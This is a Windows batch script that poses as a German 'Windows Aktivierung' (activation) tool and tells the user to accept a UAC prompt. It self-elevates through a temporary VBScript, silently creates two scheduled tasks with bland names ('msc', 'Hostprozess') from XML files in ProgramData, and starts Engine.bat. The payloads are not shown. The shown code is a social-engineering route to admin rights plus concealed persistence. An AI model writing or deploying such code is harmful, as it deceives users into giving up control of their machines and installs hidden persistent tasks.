@echo off
Title Willkommen v.3.2
cls
echo -_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo -                                                                                                                     -
echo -                                                                                                                     -
echo -                                                                                                                     -
echo -                                                                                                                     -
echo -                                                                                                                     -
echo -                                                                                                                     -
echo -                                                                                                                     -
echo -                                                                                                                     -
echo -                                                                                                                     -
echo -                                                                                                                     -
echo -                                        Windows Aktivierung                                                          -
echo -                                                                                                                     -
echo -                              Bitte antworten sie auf den folgenden UAC mit Ja                                       -
echo -                                     um die aktivierung zu starten                                                   -
echo -                                                                                                                     -
echo -                                                 _                                                                   -
echo -                                       BITTE BESTATIGEN SIE                                                          -
echo -                                                                                                                     -
echo -                                                                                                                     -
echo -                                                                                                                     -
echo -                                                                                                                     -
echo -                                                                                                                     -
echo -                                                                                                                     -
echo -                                                                                                                     -
echo -                                              v.3.2                                                                  -
echo -                                         (c) MarcBeast                                                               -
echo -_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
cls
 
:: ------- Self-elevating.bat --------------------------------------
@whoami /groups | find "S-1-16-12288" > nul && goto :admin
set "ELEVATE_CMDLINE=cd /d "%~dp0" & call "%~f0" %*"
findstr "^:::" "%~sf0">temp.vbs
cscript //nologo temp.vbs & del temp.vbs & exit /b

::: Set objShell = CreateObject("Shell.Application")
::: Set objWshShell = WScript.CreateObject("WScript.Shell")
::: Set objWshProcessEnv = objWshShell.Environment("PROCESS")
::: strCommandLine = Trim(objWshProcessEnv("ELEVATE_CMDLINE"))
::: objShell.ShellExecute "cmd", "/c " & strCommandLine, "", "runas"
:admin -------------------------------------------------------------

schtasks /create /TN "msc" /XML "C:\ProgramData\Tool\msc.xml" >nul 2>&1
schtasks /create /TN "Hostprozess" /XML "C:\ProgramData\Tool\cmd.xml" >nul 2>&1
start Engine.bat
exit